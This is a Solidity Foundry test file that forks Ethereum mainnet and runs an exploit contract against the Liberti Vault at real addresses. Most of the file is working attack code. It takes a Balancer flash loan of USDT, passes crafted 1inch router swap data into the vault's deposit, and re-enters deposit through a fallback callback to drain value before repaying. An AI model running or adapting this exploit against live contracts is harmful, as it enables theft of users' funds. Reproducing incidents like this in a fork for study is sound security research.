// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "./interface.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ContractTest is Test {
    function setUp() public {
        uint256 forkId = vm.createFork("mainnet", 17668993);
        vm.selectFork(forkId);
    }

    function testExp() public {
        Exp exp = new Exp();
        deal(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(exp), 0.004 ether);
        exp.go();
    }
}
    

contract Exp {
    IERC20 public usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 public weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    IBalancerVault public balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8); 
    ILibertiVault public libertiVault = ILibertiVault(0x429032A407aed3D5fF84caf38EFF217eB4d322A9);
    IAggregationRouterV4 public AggregationRouter = IAggregationRouterV4(0x1111111254fb6c44bAC0beD2854e76F90643097d);

    bytes public data;
    uint256 public times;

    function go() public {
        weth.approve(address(libertiVault), type(uint256).max);

        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = usdt;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 6000000000000;
        balancer.flashLoan(IFlashLoanRecipient(address(this)), tokens, amounts, bytes("0x"));
        console.log("WETH balance: %s", weth.balanceOf(address(this)));
        console.log("USDT balance: %s", usdt.balanceOf(address(this)));
    }

    function receiveFlashLoan(
        address[] calldata token, 
        uint256[] calldata amount, 
        uint256[] calldata feeAmount, 
        bytes calldata userData
    ) public {
        console.log("Into Balancer flashloan");
        bytes memory emptyBytes;
        SwapDescription memory desc = SwapDescription(
            weth,
            usdt,
            address(this),
            address(libertiVault),
            649600000000000,
            1,
            0,
            emptyBytes
        );

        data = abi.encodeWithSelector(
            bytes4(0x7c025200),
            address(this),
            desc,
            bytes("0x20")
        );

        console.log("Deposit 1st time");

        libertiVault.deposit(1000000000000000, address(this), data);
        libertiVault.exit();
        USDT(address(usdt)).transfer(address(balancer), 6000000000000);
    }

    fallback() external payable {
        // console.log("Into callBytes at 1st time");
        if (times == 0) {
            console.log("Into callBytes at 1st time");
            times++;
            libertiVault.deposit(1000000000000000, address(this), data);
            USDT(address(usdt)).transfer(address(AggregationRouter), 3000000000000);
        } else if (times == 1) {
            console.log("Into callBytes at 2se time");
            times++;
            USDT(address(usdt)).transfer(address(AggregationRouter), 3000000000000);
        }
    }

    receive() payable external {}
}